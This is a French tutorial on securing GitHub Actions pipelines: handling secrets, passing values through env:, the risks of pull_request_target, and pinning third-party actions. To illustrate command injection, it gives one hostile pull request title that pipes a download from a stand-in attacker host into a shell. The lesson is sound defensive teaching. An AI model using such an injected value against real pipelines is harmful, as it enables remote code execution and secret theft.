# Secrets et sécurité du pipeline

Un pipeline de déploiement détient les clés de la production. C'est une cible : les attaques récentes contre des chaînes de livraison passent presque toutes par une CI trop confiante.

## Les secrets

Un **secret** se définit dans les paramètres du dépôt, jamais dans le fichier du workflow. On le lit avec `${{ secrets.DEPLOY_TOKEN }}`, de préférence dans un bloc `env:` ou `with:`. GitHub masque sa valeur dans les journaux.

!!Un secret écrit dans un fichier versionné est compromis dès le premier commit : changez-le, ne vous contentez pas de le supprimer!!

## Passer par env, pas par le script

Écrire `run: ./deploy.sh ${{ secrets.DEPLOY_TOKEN }}` insère la valeur dans le texte du script avant qu'il ne s'exécute. La bonne forme donne la valeur à une variable d'environnement :

```yaml
      - name: Annoncer
        env:
          TITLE: ${{ github.event.head_commit.message }}
        run: echo "Déploiement de $TITLE"
```

## L'injection de commande

Les expressions `${{ ... }}` sont remplacées **avant** l'exécution du shell. Si le titre d'une demande de fusion est `"; curl http://pirate.example | sh; "`, un `run: echo "${{ github.event.pull_request.title }}"` exécute cette commande. Les champs `title`, `body`, `head_ref` ou le message d'un commit sont contrôlés par un tiers.

!!Ne mettez jamais une valeur venue de github.event directement dans un run: : passez-la par env: et lisez-la comme variable!!

## pull_request_target

Ce déclencheur lance le workflow du dépôt de base avec accès aux secrets, sur une demande venue d'un fork. Combiné à un `checkout` du code du fork, il exécute du code inconnu avec vos secrets. Pour une CI ordinaire, utilisez `pull_request`.

!!Ne combinez jamais pull_request_target avec l'exécution du code d'un fork!!

## Les actions tierces

Une action `acme/deploy-action@main` suit une branche : son auteur peut y publier du nouveau code que vous exécuterez sans l'avoir relu. Un **SHA de commit** complet (40 caractères) est immuable. Les actions officielles `actions/*` peuvent rester sur une version `@v4`.

**À retenir :** secrets dans les paramètres, passage par `env:`, jamais d'expression `github.event` dans un `run:`, éviter `pull_request_target`, actions tierces épinglées sur un SHA.
